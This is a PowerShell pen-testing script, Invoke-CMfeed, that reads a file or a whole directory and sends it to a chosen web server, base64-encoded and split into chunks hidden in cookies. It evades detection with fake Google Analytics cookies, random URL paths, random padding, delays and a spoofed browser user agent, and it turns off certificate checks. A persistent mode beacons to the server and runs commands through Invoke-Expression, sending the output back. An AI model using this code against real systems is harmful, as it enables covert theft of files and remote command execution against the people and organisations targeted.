Add-Type @"
    using System;
    using System.Net;
    using System.Net.Security;
    using System.Security.Cryptography.X509Certificates;
    public class ServerCertificateValidationCallback
    {
        public static void Ignore()
        {
            ServicePointManager.ServerCertificateValidationCallback += 
                delegate
                (
                    Object obj, 
                    X509Certificate certificate, 
                    X509Chain chain, 
                    SslPolicyErrors errors
                )
                {
                    return true;
                };
        }
    }
"@

FUNCTION Invoke-CMfeed {
<#
.SYNOPSIS
Invoke-CMfeed is a Windows PowerShell script that base64 encodes files and sends the data to a specified web server as cookies.

Author: Eric Kuehn
    
.DESCRIPTION
This script is designed to exfiltrate data via cookies in web requests.  It is meant to be used during pen tests to help test a client's data loss protection controls

.PARAMETER URL
The URL you want to send the data to

.PARAMETER File
The specified file will be sent to the URL

.PARAMETER Directory
All files in the specified directory will be sent to the URL

.PARAMETER Proxy
Optional parameter that sets a custom proxy that is different from the device's system proxy.

.PARAMETER Size
Allows a custom byte size for the cookie.  Defaults to 512 bytes

.PARAMETER UserAgent
Allows a custom UserAgent header to be set.  Defaults to Edge for Windows 10 devices or IE 11 for others

.EXAMPLE
Invoke-CMfeed -URL "http://172.30.39.249" -File .\CreditCards.xlsx
Sends the CreditCards.xlsx file to 172.30.39.249 over port 80

.EXAMPLE
Invoke-CMfeed -URL "https://www.professionallyevil.com" -File .\CreditCards.xlsx -Proxy http://127.0.0.1:8080
Sends the CreditCards.xlsx file to www.professionallyevil.com over port 443 through a local proxy.

.NOTES
This script is meant as a tool during a penetration test.

#>

    #///////Accept the input information for the script
    [CmdletBinding()]
    Param(
        [PARAMETER(Mandatory=$True)][string]$URL,
        [PARAMETER(Mandatory=$False)][string]$Proxy,
        [PARAMETER(Mandatory=$False)][switch]$Persistant,
        [PARAMETER(Mandatory=$False)][string]$Directory,
        [PARAMETER(Mandatory=$False)][string]$File,
        [PARAMETER(Mandatory=$False)][int]$Size,
        [PARAMETER(Mandatory=$False)][string]$UserAgent,
        [PARAMETER(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    #Allow Cookie Monster to be able to use self signed certs
    [ServerCertificateValidationCallback]::Ignore();
    
    #Add unique identifiers (GUID that looks like GoogleAnalytics cookie _ga1.2.1382222650.1620157001)
    [string]$feederID = "GA1.2." + (Get-Random -Minimum 1000000000 -Maximum 10000000000) + "." + (Get-Random -Minimum 1000000000 -Maximum 10000000000)
    $encfeederID = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($feederID))

    if (!$URL){ throw "No URL entered."} 
    else {
        #Get the Cookie Domain
        $cookiedomain = $URL.split('//')[2]
    }
    if (!$Size){ $Size = 512}
    if (!$Directory -and !$File -and !$Persistant){ throw "Nothing has been selected to be sent. Chose a File or Directory"}
    if (!$UserAgent){
        #set the current edge version for Windows 10
        $UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/" + (Get-AppxPackage -Name *MicrosoftEdge.*).version
    }
    if ($Directory -and $File){ throw "Both the File and Directory parameters have been selected."}
    if ($Directory){
        $files = Get-ChildItem -File -Path $Directory
        foreach ($f in $files){
            Convert-File -file $f
        }
    }
    if ($File){  
        $FullFile = Get-ChildItem -File -Filter $File
        Convert-File -file $FullFile
    }

    if ($Persistant) {Feed-CMforever}

    if ($invalid_parameter){ throw "$($invalid_parameter) is not a valid parameter."}

    #TODO - add min and max jitter time in seconds
}

#TODO
#Give options to change default loop time of 30 seconds
function Feed-CMforever{
    [int]$loop = 0
    do{
        $loop += 1
        if ($loop -gt 1) {Start-Sleep -s 30}

        $mn = ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("hb.hb1")))
        $encMessage = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($feederID))

        $response = (send-cookie -ChunkName $mn -ChunkData $encMessage)
        
        #do something if the server sets a cookie
        if ($response.Headers["Set-Cookie"]){

            indigestion -cmd 'whoami'
            
        }

    } while ($Persistant -eq $true)
}


function Build-Cookie ($CookieName,$CookieValue,$CookieDomain){
    $cookie = New-Object System.Net.Cookie
    $cookie.Name = $CookieName
    $cookie.Value = $CookieValue
    $cookie.Domain = $CookieDomain
    return $cookie
}

function send-cookie($ChunkName,$ChunkNum,$ChunkData){
    #appeand a random page to the end of the URL
    $url = $url + (randir)
    
    #build the web request with cookies
    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

    $session.cookies.Add((Build-Cookie -CookieName "f" -CookieValue (yuckify($ChunkName)) -CookieDomain $cookiedomain))
    $session.cookies.Add((Build-Cookie -CookieName "itn" -CookieValue (yuckify($ChunkNum)) -CookieDomain $cookiedomain))
    $session.cookies.Add((Build-Cookie -CookieName "session" -CookieValue (yuckify($ChunkData)) -CookieDomain $cookiedomain))
    $session.cookies.Add((Build-Cookie -CookieName "_ga" -CookieValue $feederID -CookieDomain $cookiedomain))
    #these two are held for backward compatability
    #$session.cookies.Add((Build-Cookie -CookieName "i" -CookieValue 1 -CookieDomain $cookiedomain))
    #$session.cookies.Add((Build-Cookie -CookieName "t" -CookieValue 2 -CookieDomain $cookiedomain))
    #$session.Cookies.Add($Scookie)

    if ($Proxy){
       return (Invoke-WebRequest -uri $url -WebSession $session -Proxy $Proxy -Method GET -UserAgent $UserAgent)
    } else {
       return (Invoke-WebRequest -uri $url -WebSession $session -Method GET -UserAgent $UserAgent)
    }
}

function Build-CookieTray($data){
    $chunkarray = @()

    $fulldata = $data.Data
    $dataLen = $fulldata.Length

    $totalChunks = [math]::Ceiling($dataLen / $Size)

    $result = New-Object -TypeName psobject -Property @{
        'TrayName' = $data.Name
        'TraySize' = $totalChunks
        'TrayType' = $data.Type
        }

    #turn string into an array of characters
    $dataArray = $fulldata.ToCharArray()

    #build the array of the different chunks of data
    for ($i=0; $i -le $totalChunks-1; $i++) {
        $StPnt = $i * $Size

        if ($i -eq $totalChunks-1){
            #Special care for the chunk which won't be 512
            $endPnt = $dataLen - $StPn  
        }
        else {
            $endPnt = $StPnt + ($Size - 1)
        }    

        $DataChunk = [string]::Concat($dataArray[$StPnt..$endPnt])
        
        #build chunk part logic
        $curChunk = $totalChunks.tostring() + "." + ($i+1).tostring()
        $encChunk = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($curChunk))

        $chunkarray += New-Object -TypeName psobject -Property @{ChunkID = ($i+1)
            ChunkPart = $encChunk
            ChunkValue = $DataChunk                                                        
            }
    }

    $result | Add-Member -MemberType NoteProperty -Name 'TrayData' -Value $chunkarray

    return $result

}

function Convert-File($file){
    #Encode the FilePath
    $fv = ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($file.Name)))
        
    #encode the File Data
    $filedata = [Convert]::ToBase64String([IO.File]::ReadAllBytes($file.FullName))

    $encfile = New-Object -TypeName psobject -Property @{Name = $fv
        Type = 'File'
        Data = $filedata                                                        
        }
    
    $tray = Build-CookieTray($encfile)

    CookieMonster($tray)

}

#TODO
#add JWT support.  data portion of feeder will go as a second base64 encoded version of the current session cookie
function build-bar($data){

}

function send-bar($data){

}

function indigestion($cmd){
    $mn = ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd)))
    $iran = Invoke-Expression $cmd
        
    #encode the File Data
    $messagedata = ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($iran)))

    $encMessage = New-Object -TypeName psobject -Property @{Name = $mn
        Type = 'Message'
        Data = $messagedata                                                        
        }
    
    $tray = Build-CookieTray($encMessage)

    #CookieMonster($encfile)
    CookieMonster($tray)
}

function yuckify($data){
    $chars = "abcdefghijkmnopqrstuvwxyzABCEFGHJKLMNPQRSTUVWXYZ123456789".ToCharArray()
    $yuck = $chars | get-random
    return $yuck + $data
}

function randir{
    $dirs = '/app','/index','/images','/download','/contact','/about','/blog','/index','/cgi-bin','/default','/account','/data','/posts','/api/v2'
    $finaldir = (Get-Random -InputObject $dirs) + "/" + (new-guid).ToString()
    return $finaldir
}

function CookieMonster($tray){

    foreach ($cookie in $tray.TrayData){
        $tries = 0
        do {
            $tries++ 
            Start-Sleep -m (get-random -maximum 2000)
            $response = send-cookie -ChunkName $tray.TrayName -ChunkNum $cookie.ChunkPart -ChunkData $cookie.ChunkValue
        } until (($response.statuscode -eq 200) -or ($tries -eq 5))
        
    }
}


